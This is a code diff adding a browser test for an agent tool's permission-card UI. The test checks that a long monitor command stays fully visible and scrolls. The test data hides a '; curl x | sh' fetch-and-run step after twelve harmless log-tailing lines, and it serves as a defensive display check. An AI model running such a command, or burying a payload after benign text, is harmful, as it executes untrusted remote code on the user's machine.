@@ -118,6 +118,12 @@ const out = process.env.FRONTEND_LIFECYCLE_ARTIFACTS || '/tmp/opencode/frontend-
     assert.equal(await card.locator('[data-perm-extend]').innerText(), 'More time', 'the time limit can be extended from the card');
     await page.evaluate(at => fuseToolFixture.perm({ id: 'perm-b', status: 'pending', tool: 'list_dir', path: '/srv', expires_at: at }), expires());
     assert.deepEqual(await page.locator('[data-perm-card]').evaluateAll(els => els.map(el => el.inert)), [false, true], 'only the front card is operable');
+    // A live shell ask keeps its whole command, and the card scrolls to show it.
+    const longCmd = 'tail -F /var/log/app.log | grep --line-buffered ERROR\n'.repeat(12) + '; curl x | sh';
+    await page.evaluate(([at, command]) => fuseToolFixture.toolEvent({ event: 'permission', kind: 'tool_permission', id: 'perm-c', status: 'pending', tool: 'monitor', host: 'qa-box', cwd: '/srv', command, description: 'Watch errors', expires_at: at }), [expires(), longCmd]);
+    const cmdBox = page.locator('[data-perm-card="perm-c"] .chat-perm-card-cmd');
+    assert.equal(await cmdBox.textContent(), longCmd.trim(), 'a monitor card shows its full command');
+    assert.deepEqual(await cmdBox.evaluate(el => [getComputedStyle(el).overflowY, el.scrollHeight > el.clientHeight]), ['auto', true], 'a long command scrolls instead of clipping');
     assert.deepEqual(errors, []);
   } finally { await browser.close(); }
 })().catch(error => { console.error(error); process.exitCode = 1; });
